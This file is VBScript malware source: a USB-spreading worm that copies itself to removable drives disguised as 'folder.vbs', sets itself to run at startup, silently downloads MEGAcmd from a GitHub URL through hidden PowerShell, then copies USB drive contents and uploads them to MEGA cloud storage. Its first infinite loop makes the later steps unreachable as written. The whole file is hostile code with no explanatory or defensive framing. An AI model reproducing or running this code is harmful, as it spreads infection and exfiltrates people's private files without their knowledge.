Option Explicit

Dim objFSO, objShell, strScriptPath, strDriveLetter, objDrive, objFolderItem, objFolder, objFile, objDestFolder

strScriptPath = WScript.ScriptFullName

Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objShell = CreateObject("WScript.Shell")

Sub CreateFolderIfNeeded(folderPath)
    If Not objFSO.FolderExists(folderPath) Then
        objFSO.CreateFolder(folderPath)
    End If
End Sub

' Copy the script to the pendrive with a folder icon
Do
    For Each objDrive In objFSO.Drives
        If objDrive.DriveType = 1 Then
            strDriveLetter = objDrive.DriveLetter
            If objFSO.FolderExists(strDriveLetter & ":\") Then
                If Not objFSO.FileExists(strDriveLetter & ":\folder.icon") Then
                    objShell.Run "cmd /c echo. > " & strDriveLetter & ":\folder.icon", 0, True
                End If
                If Not objFSO.FileExists(strDriveLetter & ":\folder.vbs") Then
                    objFSO.CopyFile strScriptPath, strDriveLetter & ":\folder.vbs"
                End If
            End If
        End If
    Next
    WScript.Sleep 5000
Loop

If Not objFSO.FileExists(objShell.SpecialFolders("Startup") & "\" & objFSO.GetFileName(strScriptPath)) Then
    objFSO.CopyFile strScriptPath, objShell.SpecialFolders("Startup") & "\" & objFSO.GetFileName(strScriptPath)
End If

If Not objFSO.FolderExists("C:\Mega") Then
    objFSO.CreateFolder("C:\Mega")
End If

If Not objFSO.FolderExists("C:\Mega\MEGAcmd") Then
    objShell.Run "powershell -Command ""(New-Object System.Net.WebClient).DownloadFile('https://github.com/snxerame/new/raw/main/MEGAcmd%20(2).zip', 'C:\Mega\MEGAcmd (2).zip')""", 0, True
    Set objShell = Nothing
    Set objFSO = Nothing
    Set objShell = CreateObject("WScript.Shell")
    Set objFSO = CreateObject("Scripting.FileSystemObject")
    objShell.Run "powershell -Command ""Expand-Archive -Path 'C:\Mega\MEGAcmd (2).zip' -DestinationPath 'C:\Mega'""", 0, True
    objFSO.DeleteFile "C:\Mega\MEGAcmd (2).zip"
End If

If Not objFSO.FolderExists("C:\Mega\MEGAcmd\backup") Then
    objFSO.CreateFolder("C:\Mega\MEGAcmd\backup")
End If

Do
    Set objFolder = objFSO.GetFolder("C:\Mega\MEGAcmd\backup")
    If objFolder.Files.Count = 0 Then
        For Each objDrive In objFSO.Drives
            If objDrive.DriveType = 1 Then
                strDriveLetter = objDrive.DriveLetter
                If objFSO.FolderExists(strDriveLetter & ":\") Then
                    objFSO.CopyFolder strDriveLetter & ":\", "C:\Mega\MEGAcmd\backup\", True
                    Exit For
                End If
            End If
        Next
    End If

    If objFSO.FolderExists("C:\Mega\MEGAcmd\backup") Then
        objShell.Run "cmd.exe /c cd /D C:\Mega\MEGAcmd && mega-put C:\Mega\MEGAcmd\backup", 0, True
    End If

    WScript.Sleep 10000
Loop
